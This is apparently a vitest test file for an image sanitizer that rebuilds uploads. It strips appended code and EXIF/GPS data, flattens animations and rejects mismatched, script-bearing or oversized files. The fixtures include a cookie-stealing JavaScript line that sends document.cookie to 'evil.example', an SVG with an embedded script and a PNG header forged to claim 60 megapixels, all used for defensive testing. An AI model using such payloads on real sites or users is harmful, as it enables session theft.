import sharp from "sharp";
import { crc32 } from "node:zlib";
import { describe, expect, it } from "vitest";
import { MAX_IMAGE_PIXELS, rebuildImage } from "./imageRebuild";

const JS = Buffer.from("const s=document.cookie;fetch('https://evil.example/?c='+s);");
const picture = (format: "png" | "jpeg" | "webp", width = 40, height = 20) =>
  sharp({ create: { width, height, channels: 3, background: { r: 200, g: 40, b: 90 } } }).toFormat(format).toBuffer();
const rebuilt = async (bytes: Buffer, type: string) => {
  const r = await rebuildImage(bytes, type);
  if (!r.ok) throw new Error(r.reason);
  return r.bytes;
};

describe("image rebuilding", () => {
  it("drops code appended after a real image, keeping a valid picture of the same size and type", async () => {
    for (const [format, type] of [["png", "image/png"], ["jpeg", "image/jpeg"], ["webp", "image/webp"]] as const) {
      const out = await rebuilt(Buffer.concat([await picture(format), JS]), type);
      expect(out.includes(Buffer.from("document.cookie")), format).toBe(false);
      expect(await sharp(out).metadata(), format).toMatchObject({ format, width: 40, height: 20 });
    }
  });

  it("strips photo metadata (GPS, camera) and turns the photo upright from its EXIF orientation", async () => {
    // Stored sideways with orientation 6 ("rotate 90° to view"), as phones do.
    const photo = await sharp(await picture("jpeg", 40, 20)).withMetadata({ orientation: 6 }).withExif({ IFD0: { Make: "PhoneCo", Model: "X1" }, IFD3: { GPSLatitudeRef: "N", GPSLatitude: "51/1 30/1 0/1" } }).toBuffer();
    expect(await sharp(photo).metadata()).toMatchObject({ orientation: 6, exif: expect.any(Buffer) });
    expect(photo.includes(Buffer.from("PhoneCo"))).toBe(true);
    const out = await rebuilt(photo, "image/jpeg");
    const meta = await sharp(out).metadata();
    expect(meta.exif).toBeUndefined();
    expect(meta.orientation).toBeUndefined();
    expect([meta.width, meta.height]).toEqual([20, 40]);
    expect(out.includes(Buffer.from("PhoneCo"))).toBe(false);
  });

  it("keeps only the first frame of an animated image", async () => {
    const frames = sharp({ create: { width: 10, height: 30, channels: 4, background: "#0f0" } }).webp();
    const animated = await sharp(await frames.toBuffer(), { pages: -1 }).webp({ loop: 0, delay: [100, 100, 100] }).toBuffer();
    expect((await sharp(await rebuilt(animated, "image/webp")).metadata()).pages ?? 1).toBe(1);
  });

  it("refuses files that aren't the picture their first bytes claim, and pictures over the pixel limit", async () => {
    const pngHeaderOnly = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), JS]);
    expect(await rebuildImage(pngHeaderOnly, "image/png")).toEqual({ ok: false, reason: expect.stringMatching(/couldn't be read/) });
    // A real PNG presented as a JPEG.
    expect(await rebuildImage(await picture("png"), "image/jpeg")).toEqual({ ok: false, reason: expect.stringMatching(/couldn't be read/) });
    const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><script>alert(1)</script></svg>');
    expect((await rebuildImage(svg, "image/png")).ok).toBe(false);
    // A 1×1 PNG whose header claims 10,000 × 6,000 (60 MP): refused from the header, before any pixels are decoded.
    const huge = Buffer.from(await picture("png", 1, 1));
    huge.writeUInt32BE(10_000, 16); huge.writeUInt32BE(6_000, 20);
    huge.writeUInt32BE(crc32(huge.subarray(12, 29)) >>> 0, 29);
    expect(10_000 * 6_000).toBeGreaterThan(MAX_IMAGE_PIXELS);
    expect(await rebuildImage(huge, "image/png")).toEqual({ ok: false, reason: expect.stringMatching(/too large \(over 50 megapixels\)/) });
  });

  it("leaves PDFs (and other non-pictures) exactly as they are", async () => {
    const pdf = Buffer.from("%PDF-1.7\n% test\n");
    expect(await rebuildImage(pdf, "application/pdf")).toEqual({ ok: true, bytes: pdf });
  });
});
